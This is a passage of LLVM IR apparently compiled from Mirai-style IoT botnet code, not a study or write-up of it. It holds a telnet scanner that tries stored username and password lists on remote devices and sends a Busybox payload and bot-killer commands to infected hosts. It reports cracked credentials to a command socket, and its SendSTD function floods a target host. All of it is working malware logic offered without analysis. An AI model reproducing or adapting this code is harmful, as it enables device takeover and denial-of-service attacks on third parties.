  %522 = sub i32 %521, -299242996
  %523 = add i32 %522, 7
  %524 = add i32 %523, -299242996
  %525 = add i32 %521, 7
  %526 = zext i32 %524 to i64
  %527 = call i64 @time(i64* null) #5
  %528 = icmp slt i64 %526, %527
  br i1 %528, label %529, label %533

; <label>:529:                                    ; preds = %516
  %530 = load i32, i32* %6, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %531
  call void @reset_telstate(%struct.telstate_t* %532)
  br label %533

; <label>:533:                                    ; preds = %529, %516
  br label %927

; <label>:534:                                    ; preds = %95
  %535 = load i32, i32* %6, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 0
  %539 = load i32, i32* %538, align 16
  %540 = load i32, i32* %6, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 5
  %544 = load i8, i8* %543, align 1
  %545 = zext i8 %544 to i64
  %546 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %545
  %547 = load i8*, i8** %546, align 8
  %548 = load i32, i32* %6, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 5
  %552 = load i8, i8* %551, align 1
  %553 = zext i8 %552 to i64
  %554 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %553
  %555 = load i8*, i8** %554, align 8
  %556 = call i64 @strlen(i8* %555) #9
  %557 = call i64 @send(i32 %539, i8* %547, i64 %556, i32 16384)
  %558 = icmp slt i64 %557, 0
  br i1 %558, label %559, label %563

; <label>:559:                                    ; preds = %534
  %560 = load i32, i32* %6, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %561
  call void @reset_telstate(%struct.telstate_t* %562)
  br label %928

; <label>:563:                                    ; preds = %534
  %564 = load i32, i32* %6, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 0
  %568 = load i32, i32* %567, align 16
  %569 = call i64 @send(i32 %568, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %570 = icmp slt i64 %569, 0
  br i1 %570, label %571, label %575

; <label>:571:                                    ; preds = %563
  %572 = load i32, i32* %6, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %573
  call void @reset_telstate(%struct.telstate_t* %574)
  br label %928

; <label>:575:                                    ; preds = %563
  %576 = load i32, i32* %6, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %577
  call void @advance_telstate(%struct.telstate_t* %578, i32 6)
  br label %927

; <label>:579:                                    ; preds = %95
  %580 = load i32, i32* %6, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %581
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %582, i32 0, i32 0
  %584 = load i32, i32* %583, align 16
  %585 = load i32, i32* %3, align 4
  %586 = load i32, i32* %6, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 9
  %590 = load i8*, i8** %589, align 8
  %591 = call i32 @read_until_response(i32 %584, i32 %585, i8* %590, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %592 = icmp ne i32 %591, 0
  br i1 %592, label %593, label %664

; <label>:593:                                    ; preds = %579
  %594 = call i64 @time(i64* null) #5
  %595 = trunc i64 %594 to i32
  %596 = load i32, i32* %6, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 7
  store i32 %595, i32* %599, align 16
  %600 = load i32, i32* %6, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 9
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @contains_fail(i8* %604)
  %606 = icmp ne i32 %605, 0
  br i1 %606, label %607, label %611

; <label>:607:                                    ; preds = %593
  %608 = load i32, i32* %6, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %609
  call void @advance_telstate(%struct.telstate_t* %610, i32 0)
  br label %663

; <label>:611:                                    ; preds = %593
  %612 = load i32, i32* %6, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 9
  %616 = load i8*, i8** %615, align 8
  %617 = call i32 @contains_success(i8* %616)
  %618 = icmp ne i32 %617, 0
  br i1 %618, label %619, label %658

; <label>:619:                                    ; preds = %611
  %620 = load i32, i32* %6, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 3
  %624 = load i8, i8* %623, align 1
  %625 = zext i8 %624 to i32
  %626 = icmp eq i32 %625, 2
  br i1 %626, label %627, label %631

; <label>:627:                                    ; preds = %619
  %628 = load i32, i32* %6, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %629
  call void @advance_telstate(%struct.telstate_t* %630, i32 7)
  br label %657

; <label>:631:                                    ; preds = %619
  %632 = load i32, i32* @mainCommSock, align 4
  %633 = load i32, i32* %6, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %634
  %636 = call i8* @get_telstate_host(%struct.telstate_t* %635)
  %637 = load i32, i32* %6, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 4
  %641 = load i8, i8* %640, align 2
  %642 = zext i8 %641 to i64
  %643 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %642
  %644 = load i8*, i8** %643, align 8
  %645 = load i32, i32* %6, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 5
  %649 = load i8, i8* %648, align 1
  %650 = zext i8 %649 to i64
  %651 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %650
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 (i32, i8*, ...) @sockprintf(i32 %632, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i32 0, i32 0), i8* %636, i8* %644, i8* %652)
  %654 = load i32, i32* %6, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %655
  call void @advance_telstate(%struct.telstate_t* %656, i32 7)
  br label %657

; <label>:657:                                    ; preds = %631, %627
  br label %662

; <label>:658:                                    ; preds = %611
  %659 = load i32, i32* %6, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %660
  call void @reset_telstate(%struct.telstate_t* %661)
  br label %662

; <label>:662:                                    ; preds = %658, %657
  br label %663

; <label>:663:                                    ; preds = %662, %607
  br label %928

; <label>:664:                                    ; preds = %579
  %665 = load i32, i32* %6, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 7
  %669 = load i32, i32* %668, align 16
  %670 = sub i32 0, 7
  %671 = sub i32 %669, %670
  %672 = add i32 %669, 7
  %673 = zext i32 %671 to i64
  %674 = call i64 @time(i64* null) #5
  %675 = icmp slt i64 %673, %674
  br i1 %675, label %676, label %680

; <label>:676:                                    ; preds = %664
  %677 = load i32, i32* %6, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %678
  call void @reset_telstate(%struct.telstate_t* %679)
  br label %680

; <label>:680:                                    ; preds = %676, %664
  br label %927

; <label>:681:                                    ; preds = %95
  %682 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %683 = call i32 (i8*, i8*, ...) @sprintf(i8* %682, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %684 = load i32, i32* %6, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 0
  %688 = load i32, i32* %687, align 16
  %689 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %690 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %691 = call i64 @strlen(i8* %690) #9
  %692 = call i64 @send(i32 %688, i8* %689, i64 %691, i32 16384)
  %693 = icmp slt i64 %692, 0
  br i1 %693, label %694, label %698

; <label>:694:                                    ; preds = %681
  %695 = load i32, i32* %6, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %696
  call void @reset_telstate(%struct.telstate_t* %697)
  br label %928

; <label>:698:                                    ; preds = %681
  call void @RemoveTempDirs()
  %699 = load i32, i32* @mainCommSock, align 4
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %701
  %703 = call i8* @get_telstate_host(%struct.telstate_t* %702)
  %704 = load i32, i32* %6, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 4
  %708 = load i8, i8* %707, align 2
  %709 = zext i8 %708 to i64
  %710 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %709
  %711 = load i8*, i8** %710, align 8
  %712 = load i32, i32* %6, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 5
  %716 = load i8, i8* %715, align 1
  %717 = zext i8 %716 to i64
  %718 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %717
  %719 = load i8*, i8** %718, align 8
  %720 = call i32 (i32, i8*, ...) @sockprintf(i32 %699, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i32 0, i32 0), i8* %703, i8* %711, i8* %719)
  %721 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %722 = call i32 (i8*, i8*, ...) @sprintf(i8* %721, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %723 = load i32, i32* %6, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 16
  %728 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %729 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %730 = call i64 @strlen(i8* %729) #9
  %731 = call i64 @send(i32 %727, i8* %728, i64 %730, i32 16384)
  %732 = icmp slt i64 %731, 0
  br i1 %732, label %733, label %737

; <label>:733:                                    ; preds = %698
  %734 = load i32, i32* %6, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %735
  call void @reset_telstate(%struct.telstate_t* %736)
  br label %928

; <label>:737:                                    ; preds = %698
  %738 = load i32, i32* @mainCommSock, align 4
  %739 = load i32, i32* %6, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %740
  %742 = call i8* @get_telstate_host(%struct.telstate_t* %741)
  %743 = load i32, i32* %6, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %744
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %745, i32 0, i32 4
  %747 = load i8, i8* %746, align 2
  %748 = zext i8 %747 to i64
  %749 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %748
  %750 = load i8*, i8** %749, align 8
  %751 = load i32, i32* %6, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 5
  %755 = load i8, i8* %754, align 1
  %756 = zext i8 %755 to i64
  %757 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %756
  %758 = load i8*, i8** %757, align 8
  %759 = call i32 (i32, i8*, ...) @sockprintf(i32 %738, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i32 0, i32 0), i8* %742, i8* %750, i8* %758)
  %760 = load i32, i32* %6, align 4
  %761 = sext i32 %760 to i64
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %761
  call void @advance_telstate(%struct.telstate_t* %762, i32 8)
  br label %927

; <label>:763:                                    ; preds = %95
  %764 = call i64 @time(i64* null) #5
  %765 = trunc i64 %764 to i32
  %766 = load i32, i32* %6, align 4
  %767 = sext i32 %766 to i64
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %767
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %768, i32 0, i32 7
  store i32 %765, i32* %769, align 16
  %770 = load i32, i32* %6, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %771
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %772, i32 0, i32 0
  %774 = load i32, i32* %773, align 16
  %775 = call i64 @send(i32 %774, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i32 0, i32 0), i64 4, i32 16384)
  %776 = icmp slt i64 %775, 0
  br i1 %776, label %777, label %778

; <label>:777:                                    ; preds = %763
  br label %778

; <label>:778:                                    ; preds = %777, %763
  %779 = load i32, i32* %6, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %780
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %781, i32 0, i32 0
  %783 = load i32, i32* %782, align 16
  %784 = call i64 @send(i32 %783, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.508, i32 0, i32 0), i64 7, i32 16384)
  %785 = icmp slt i64 %784, 0
  br i1 %785, label %786, label %787

; <label>:786:                                    ; preds = %778
  br label %787

; <label>:787:                                    ; preds = %786, %778
  %788 = load i32, i32* %6, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %789
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %790, i32 0, i32 0
  %792 = load i32, i32* %791, align 16
  %793 = load i8*, i8** @Busybox_Payload, align 8
  %794 = load i8*, i8** @Busybox_Payload, align 8
  %795 = call i64 @strlen(i8* %794) #9
  %796 = call i64 @send(i32 %792, i8* %793, i64 %795, i32 16384)
  %797 = icmp slt i64 %796, 0
  br i1 %797, label %798, label %802

; <label>:798:                                    ; preds = %787
  %799 = load i32, i32* %6, align 4
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %800
  call void @reset_telstate(%struct.telstate_t* %801)
  br label %928

; <label>:802:                                    ; preds = %787
  %803 = load i32, i32* @mainCommSock, align 4
  %804 = load i32, i32* %6, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %805
  %807 = call i8* @get_telstate_host(%struct.telstate_t* %806)
  %808 = load i32, i32* %6, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 4
  %812 = load i8, i8* %811, align 2
  %813 = zext i8 %812 to i64
  %814 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %813
  %815 = load i8*, i8** %814, align 8
  %816 = load i32, i32* %6, align 4
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %817
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %818, i32 0, i32 5
  %820 = load i8, i8* %819, align 1
  %821 = zext i8 %820 to i64
  %822 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %821
  %823 = load i8*, i8** %822, align 8
  %824 = call i32 (i32, i8*, ...) @sockprintf(i32 %803, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.509, i32 0, i32 0), i8* %807, i8* %815, i8* %823)
  %825 = load i32, i32* %6, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 0
  %829 = load i32, i32* %828, align 16
  %830 = load i32, i32* %3, align 4
  %831 = load i32, i32* %6, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %832
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %833, i32 0, i32 9
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 @read_until_response(i32 %829, i32 %830, i8* %835, i32 1024, i8** bitcast ([10 x i8]* @.str.513 to i8**))
  %837 = icmp ne i32 %836, 0
  br i1 %837, label %838, label %878

; <label>:838:                                    ; preds = %802
  %839 = load i32, i32* %6, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 9
  %843 = load i8*, i8** %842, align 8
  %844 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %843, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i32 0, i32 0))
  %845 = icmp ne i32 %844, 0
  br i1 %845, label %846, label %877

; <label>:846:                                    ; preds = %838
  %847 = load i32, i32* %6, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 3
  %851 = load i8, i8* %850, align 1
  %852 = zext i8 %851 to i32
  %853 = icmp ne i32 %852, 3
  br i1 %853, label %854, label %877

; <label>:854:                                    ; preds = %846
  %855 = load i32, i32* @mainCommSock, align 4
  %856 = load i32, i32* %6, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %857
  %859 = call i8* @get_telstate_host(%struct.telstate_t* %858)
  %860 = load i32, i32* %6, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 4
  %864 = load i8, i8* %863, align 2
  %865 = zext i8 %864 to i64
  %866 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %865
  %867 = load i8*, i8** %866, align 8
  %868 = load i32, i32* %6, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 5
  %872 = load i8, i8* %871, align 1
  %873 = zext i8 %872 to i64
  %874 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %873
  %875 = load i8*, i8** %874, align 8
  %876 = call i32 (i32, i8*, ...) @sockprintf(i32 %855, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i32 0, i32 0), i8* %859, i8* %867, i8* %875)
  br label %877

; <label>:877:                                    ; preds = %854, %846, %838
  br label %878

; <label>:878:                                    ; preds = %877, %802
  %879 = load i32, i32* %6, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %880
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %881, i32 0, i32 7
  %883 = load i32, i32* %882, align 16
  %884 = sub i32 %883, 1805440986
  %885 = add i32 %884, 45
  %886 = add i32 %885, 1805440986
  %887 = add i32 %883, 45
  %888 = zext i32 %886 to i64
  %889 = call i64 @time(i64* null) #5
  %890 = icmp slt i64 %888, %889
  br i1 %890, label %891, label %926

; <label>:891:                                    ; preds = %878
  %892 = load i32, i32* %6, align 4
  %893 = sext i32 %892 to i64
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %893
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %894, i32 0, i32 3
  %896 = load i8, i8* %895, align 1
  %897 = zext i8 %896 to i32
  %898 = icmp ne i32 %897, 3
  br i1 %898, label %899, label %922

; <label>:899:                                    ; preds = %891
  %900 = load i32, i32* @mainCommSock, align 4
  %901 = load i32, i32* %6, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %902
  %904 = call i8* @get_telstate_host(%struct.telstate_t* %903)
  %905 = load i32, i32* %6, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %906
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %907, i32 0, i32 4
  %909 = load i8, i8* %908, align 2
  %910 = zext i8 %909 to i64
  %911 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %910
  %912 = load i8*, i8** %911, align 8
  %913 = load i32, i32* %6, align 4
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %914
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %915, i32 0, i32 5
  %917 = load i8, i8* %916, align 1
  %918 = zext i8 %917 to i64
  %919 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %918
  %920 = load i8*, i8** %919, align 8
  %921 = call i32 (i32, i8*, ...) @sockprintf(i32 %900, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.512, i32 0, i32 0), i8* %904, i8* %912, i8* %920)
  br label %922

; <label>:922:                                    ; preds = %899, %891
  %923 = load i32, i32* %6, align 4
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %924
  call void @reset_telstate(%struct.telstate_t* %925)
  br label %926

; <label>:926:                                    ; preds = %922, %878
  br label %927

; <label>:927:                                    ; preds = %926, %737, %680, %575, %533, %475, %433, %377, %244, %95
  br label %928

; <label>:928:                                    ; preds = %927, %798, %733, %694, %663, %571, %559, %515, %471, %459, %414, %354, %350, %206, %175
  %929 = load i32, i32* %6, align 4
  %930 = sub i32 0, 1
  %931 = sub i32 %929, %930
  %932 = add nsw i32 %929, 1
  store i32 %931, i32* %6, align 4
  br label %77

; <label>:933:                                    ; preds = %77
  br label %75
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [24 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %68, %3
  %39 = bitcast [24 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([24 x i8*]* @SendSTD.randstrings to i8*), i64 192, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 24
  %43 = getelementptr inbounds [24 x i8*], [24 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %68

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 69, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #5
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 0, %55
  %59 = sub i64 0, %57
  %60 = add i64 %58, %59
  %61 = sub i64 0, %60
  %62 = add nsw i64 %55, %57
  %63 = icmp sge i64 %54, %61
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %47
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @close(i32 %65)
  call void @_exit(i32 0) #11
  unreachable

; <label>:67:                                     ; preds = %47
  store i32 0, i32* %11, align 4
  br label %68

; <label>:68:                                     ; preds = %67, %38
  %69 = load i32, i32* %11, align 4
  %70 = sub i32 0, 1
  %71 = sub i32 %69, %70
  %72 = add i32 %69, 1
  store i32 %71, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void
